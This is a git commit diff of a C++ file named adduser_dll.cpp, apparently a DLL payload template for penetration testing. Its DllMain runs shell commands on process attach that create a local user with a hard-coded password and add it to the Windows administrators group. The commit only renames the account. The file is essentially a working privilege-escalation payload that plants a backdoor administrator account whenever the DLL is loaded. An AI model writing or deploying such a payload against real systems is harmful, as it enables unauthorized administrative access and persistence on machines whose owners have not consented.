3355d1b911cbc7d23501cc9ffa73711e77a659f8
ferreirasc <leoferreirafx@gmail.com>
2022-04-12 18:24:12 -0400

    adding fresh DLL template

--- adduser_dll.cpp
+++ adduser_dll.cpp
@@ -10,8 +10,8 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-        system("cmd.exe /c net user ferreirasc BadPass1BadPass3 /add /y 2>C:\\error.txt");
-        system("cmd.exe /c net localgroup administrators ferreirasc /add");
+        system("cmd.exe /c net user isecurity BadPass1BadPass3 /add /y 2>C:\\error.txt");
+        system("cmd.exe /c net localgroup administrators isecurity /add");
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
